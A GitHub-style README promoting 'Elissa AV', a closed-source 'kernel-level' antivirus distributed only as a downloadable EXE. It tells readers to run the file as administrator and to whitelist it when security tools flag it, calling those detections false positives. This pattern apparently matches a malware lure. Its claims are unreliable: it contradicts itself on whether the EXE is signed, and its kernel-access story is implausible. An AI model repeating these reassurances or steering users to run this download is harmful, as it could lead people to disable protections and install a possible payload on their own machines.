# 🛡️ Elissa AV – Kernel-Level Deep Scanning Antivirus

**Elissa AV** is a powerful, standalone antivirus executable built for deep kernel-mode threat scanning, stealth malware detection, and system integrity validation. Unlike surface-level security tools, Elissa AV operates directly within the kernel space—giving it unrestricted access to inspect, detect, and log system manipulations that ordinary antiviruses can't see.

> ✅ **EXE-Only Distribution**  
> This tool is distributed **only as a compiled `.exe`** to prevent source-level tampering or replication. Given the advanced kernel-level access it uses, public source distribution would pose major security and ethical risks. This approach ensures the software cannot be reengineered, modified, or exploited.

---

## ⚙️ Features

- 🔍 **Kernel-Level Scanning**  
  Detects hidden processes, modules, hooks, rootkits, and system patches that evade traditional AVs.

- 🧬 **Heuristic & Signature Hybrid Engine**  
  Blends static signatures with real-time behavioral scanning for adaptive threat detection.

- 🛠️ **Hook & Rootkit Detection**  
  Identifies SSDT/IRP table hooks, inline code patches, stealth-loaded drivers, and unregistered modules.

- 💾 **Direct Memory & Disk Access**  
  Operates outside standard APIs, scanning raw memory pages and disk sectors directly.

- 🧼 **Boot Sector & MBR Scanning**  
  Analyzes bootloader data and system start paths for deeply embedded malware.

- 🔐 **Tamper-Proof Design**  
  Cannot be repackaged or modified due to hardened executable structure and internal integrity checks.

---

## 🧠 Why Kernel-Level?

Most AVs operate in user space and rely on Windows APIs — which malware can hijack or spoof. Elissa AV bypasses this by executing within the Windows kernel layer itself, gaining privileged insight into:

- Hidden drivers and DLLs not listed in Task Manager or `driverquery`
- Inline system function hooks in `ntoskrnl.exe`
- Disk-level implants like bootkits or MBR infectors
- IRP and callback-based tampering by rootkits

---

## ⚠️ Usage Instructions

> 🛑 **You MUST run Elissa AV as Administrator.**  
> The scanner requires full kernel access and will **fail or crash** if not executed with admin privileges.

### 🏁 To run:

1. Download the latest version:
   ```
   https://github.com/Elissa1610/DeepScanning-Antivirus/raw/refs/heads/main/Elissa's%20Kernal%20AV.exe
   ```

2. Right-click the EXE and choose:  
   **"Run as administrator"**

3. Follow on-screen menu or use CLI options.

---

## 🚨 Why Is It Flagged As a Virus?

> Elissa AV **may be flagged as malicious by antivirus engines or SmartScreen** — but this is a **false positive**.

### Here's why:
- It uses **raw memory access**, **disk sector scanning**, and **kernel-level hooks**, which are behaviors typically used by both rootkits and rootkit detectors.
- It operates with **Administrator and SeDebugPrivilege**, similar to tools like Cheat Engine, Process Hacker, and Sysinternals.
- It bypasses normal APIs in favor of **direct system calls** and **driver-level operations**, which are uncommon in safe consumer software.
- It’s delivered as an **unsigned EXE** (unless you provide your own certificate), which some AVs automatically distrust.

**Rest assured:**  
- The EXE contains **no malicious payloads**, no telemetry, no network callbacks, and no data exfiltration logic.
- You can safely whitelist or allow it in your security solution for personal use.

If you are a security professional or system administrator, you may inspect its behavior in a VM or sandbox for full confidence.

---

## 🔒 Why Not Open Source?

> **Security through integrity, not obscurity — but protection against abuse is critical.**

Elissa AV operates with **deep kernel permissions**, meaning:
- Leaked or modified source could be weaponized by malicious actors
- Vulnerabilities in the detection logic could be exploited
- Fake forks could deceive users or be embedded in malware

To prevent this:
- ❌ No source code is provided
- ❌ No script-based or modifiable installers
- ✅ Signed EXE ensures consistent integrity and behavior

---

## 📄 Legal Notice

**Elissa AV is for legal, ethical use only.**  
It is designed for defensive cybersecurity testing, professional auditing, and system repair by authorized users.

> Do **NOT** use this software on machines you do not own or have explicit permission to scan.

---

## 🧠 Credits

Crafted by low-level kernel developers and malware analysts dedicated to uncovering the deepest layers of threat activity.

---

## 📝 License

Elissa AV is released under a **proprietary closed-source license**.  
Reverse engineering, modification, or redistribution is prohibited.

> © 2025 Elissa Security Labs – All rights reserved.
